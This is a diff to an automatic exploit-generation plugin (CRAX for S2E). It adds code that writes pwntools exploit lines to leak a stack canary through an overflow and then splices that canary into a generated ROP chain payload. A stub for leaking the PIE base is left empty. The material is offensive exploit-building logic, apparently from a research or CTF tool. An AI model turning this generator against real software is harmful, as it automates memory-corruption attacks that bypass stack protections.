@@ -22,6 +22,8 @@
 #include <s2e/Plugins/CRAX/Expr/BinaryExprEvaluator.h>
 #include <s2e/Plugins/CRAX/Modules/Techniques/Technique.h>
 #include <s2e/Plugins/CRAX/Modules/Techniques/StackPivot.h>
+#include <s2e/Plugins/CRAX/Pwnlib/Util.h>
+#include <s2e/Plugins/CRAX/Utils/StringUtil.h>
 
 #include <klee/Expr.h>
 
@@ -41,6 +43,25 @@ using ConcreteRopPayload = Technique::ConcreteRopPayload;
 
 bool RopChainBuilder::build(Exploit &exploit,
                             const std::vector<Technique *> &techniques) {
+    // [Optional] generate code to leak canary.
+    if (exploit.getElf().getChecksec().hasCanary) {
+        exploit.appendRopPayload(format("b'A' * %d", exploit.getCanaryLeakOffset()));
+        exploit.flushRopPayload();
+
+        exploit.writelines({
+            format("    proc.recvuntil(b'A' * %d)", exploit.getCanaryLeakOffset()),
+            "    canary = b'\\x00' + proc.recv(7)",
+            "    log.info('leaked canary: {}'.format(hex(u64(canary))))",
+            ""
+        });
+    }
+
+    // [Optional] generate code to leak ELF base.
+    if (exploit.getElf().getChecksec().hasPIE) {
+
+    }
+
+    // [Required] generate ROP chain.
     for (auto t : techniques) {
         std::vector<SymbolicRopPayload> symbolicRopPayloadList = t->getSymbolicRopPayloadList();
 
@@ -92,6 +113,20 @@ bool RopChainBuilder::build(Exploit &exploit,
                 symbolicPayload += format("\\x%02x", __byte);
             }
             symbolicPayload += "'";
+
+            // XXX: You mad bro?
+            if (exploit.getElf().getChecksec().hasCanary) {
+                assert(exploit.getElf().getCanary() != 0 && "Corrupted canary?");
+
+                std::string canaryBytes;  // in "\xff\xff..." form
+                for (auto __byte : p64(exploit.getElf().getCanary())) {
+                    canaryBytes += format("\\x%02x", __byte);
+                }
+                log<WARN>() << "canary: " << klee::hexval(exploit.getElf().getCanary()) << '\n';
+                log<WARN>() << "replacing: " << canaryBytes << '\n';
+                symbolicPayload = replace(symbolicPayload, canaryBytes, "' + canary + b'");
+            }
+
             exploit.appendRopPayload(symbolicPayload);
             exploit.flushRopPayload();
 
